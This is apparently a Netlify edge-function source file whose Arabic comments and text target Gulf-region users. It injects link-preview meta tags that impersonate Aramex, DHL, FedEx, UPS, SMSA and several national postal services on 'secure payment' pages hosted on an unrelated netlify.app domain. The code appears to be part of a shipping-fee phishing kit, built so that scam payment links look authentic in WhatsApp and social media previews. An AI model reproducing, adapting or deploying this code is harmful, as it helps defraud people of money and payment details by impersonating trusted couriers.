import type { Context } from "https://edge.netlify.com";

// GitHub CDN - موثوق 100% لحل مشكلة WhatsApp cache
const GITHUB_CDN = 'https://raw.githubusercontent.com/you3333ef/Youssef-Dafa/main/public';
const SITE_URL = 'https://kaleidoscopic-kheer-73d72f.netlify.app';

const serviceOGImages: Record<string, string> = {
  aramex: '/og-aramex.jpg',
  dhl: '/og-dhl.jpg',
  dhlkw: '/og-dhl.jpg',
  dhlqa: '/og-dhl.jpg',
  dhlom: '/og-dhl.jpg',
  dhlbh: '/og-dhl.jpg',
  fedex: '/og-fedex.jpg',
  ups: '/og-ups.jpg',
  smsa: '/og-smsa.jpg',
  naqel: '/og-naqel.jpg',
  zajil: '/og-zajil.jpg',
  saudipost: '/og-saudipost.jpg',
  empost: '/og-empost.jpg',
  qpost: '/og-qpost.jpg',
  kwpost: '/og-kwpost.jpg',
  omanpost: '/og-omanpost.jpg',
  bahpost: '/og-bahpost.jpg',
  albaraka: '/og-albaraka.jpg',
  alfuttaim: '/og-alfuttaim.jpg',
  alshaya: '/og-alshaya.jpg',
  bahri: '/og-bahri.jpg',
  shipco: '/og-shipco.jpg',
  hellmann: '/og-hellmann.jpg',
  dsv: '/og-dsv.jpg',
  genacom: '/og-genacom.jpg',
  jinaken: '/og-jinaken.jpg',
  jinakum: '/og-jinakum.jpg',
};

const serviceTitles: Record<string, string> = {
  aramex: 'أرامكس - Aramex',
  dhl: 'دي إتش إل - DHL',
  fedex: 'فيدكس - FedEx',
  ups: 'يو بي إس - UPS',
  smsa: 'سمسا - SMSA',
  naqel: 'ناقل إكسبرس - Naqel Express',
  zajil: 'زاجل إكسبرس - Zajil Express',
  saudipost: 'البريد السعودي - Saudi Post',
  empost: 'البريد الإماراتي - Emirates Post',
  qpost: 'بريد قطر - Q-Post',
  kwpost: 'بريد الكويت - Kuwait Post',
  omanpost: 'بريد عمان - Oman Post',
  bahpost: 'بريد البحرين - Bahrain Post',
};

const serviceDescriptions: Record<string, string> = {
  aramex: 'أكمل دفع شحنتك مع أرامكس بشكل آمن وسريع. نظام دفع محمي بالكامل مع تتبع فوري للمعاملات.',
  dhl: 'ادفع قيمة شحنتك مع DHL بأمان تام. خدمة شحن عالمية موثوقة مع نظام دفع محمي.',
  fedex: 'أكمل الدفع لشحنة FedEx الخاصة بك بسهولة وأمان. نظام دفع مشفر ومضمون 100%.',
  ups: 'ادفع لشحنة UPS بشكل آمن وسريع. نظام دفع محمي مع ضمان الأمان الكامل.',
  smsa: 'أكمل دفع شحنتك مع SMSA بأمان. نظام دفع موثوق ومحمي بتشفير SSL.',
  naqel: 'ادفع قيمة الشحنة مع ناقل إكسبرس بأمان تام. نظام دفع سريع ومضمون.',
  zajil: 'أكمل الدفع لشحنة زاجل إكسبرس بسهولة وأمان. خدمة دفع محمية ومشفرة.',
};

export default async (request: Request, context: Context) => {
  const url = new URL(request.url);
  
  // استخراج company من Path Parameters أولاً (دعم /p/:id/:company/:currency/:amount)
  const pathParts = url.pathname.split('/');
  let pathCompany = null;
  
  if (pathParts[1] === 'p' && pathParts.length >= 4) {
    pathCompany = pathParts[3]; // /p/id/company/...
  }
  
  // الأولوية: Path Parameters > Query Parameters
  const company = pathCompany || 
                  url.searchParams.get('company') || 
                  url.searchParams.get('c') ||
                  url.searchParams.get('service') ||
                  url.searchParams.get('entity');
  
  const path = url.pathname;
  const isPaymentPage = path.includes('/pay/') || path.includes('/p/') || path.includes('/recipient');
  
  if (!isPaymentPage) {
    return context.next();
  }
  
  const response = await context.next();
  const html = await response.text();
  
  if (!company) {
    return new Response(html, {
      headers: response.headers,
    });
  }
  
  const companyKey = company.toLowerCase();
  const ogImage = serviceOGImages[companyKey] || '/og-aramex.jpg';
  const fullImageUrl = `${GITHUB_CDN}${ogImage}`;
  
  const title = serviceTitles[companyKey] 
    ? `${serviceTitles[companyKey]} - نظام الدفع الآمن` 
    : 'نظام الدفع الآمن - دفع إلكتروني سريع وموثوق';
  
  const description = serviceDescriptions[companyKey] || 
    'منصة متكاملة للدفع الإلكتروني في دول الخليج. آمن وسريع ومضمون 100%';
  
  const currentUrl = url.toString();
  
  const ogTags = `
    <!-- Primary Meta Tags -->
    <title>${title}</title>
    <meta name="title" content="${title}" />
    <meta name="description" content="${description}" />
    
    <!-- Open Graph / Facebook / WhatsApp -->
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="نظام الدفع الآمن" />
    <meta property="og:locale" content="ar_AR" />
    <meta property="og:url" content="${currentUrl}" />
    <meta property="og:title" content="${title}" />
    <meta property="og:description" content="${description}" />
    <meta property="og:image" content="${fullImageUrl}" />
    <meta property="og:image:secure_url" content="${fullImageUrl}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:alt" content="${title}" />
    
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:domain" content="${url.hostname}" />
    <meta name="twitter:url" content="${currentUrl}" />
    <meta name="twitter:title" content="${title}" />
    <meta name="twitter:description" content="${description}" />
    <meta name="twitter:image" content="${fullImageUrl}" />
    <meta name="twitter:image:alt" content="${title}" />
  `.trim();
  
  const modifiedHtml = html.replace(
    /<head>/i,
    `<head>\n${ogTags}\n`
  );
  
  return new Response(modifiedHtml, {
    headers: {
      ...Object.fromEntries(response.headers),
      'content-type': 'text/html; charset=utf-8',
      'cache-control': 'public, max-age=0, must-revalidate',
    },
  });
};
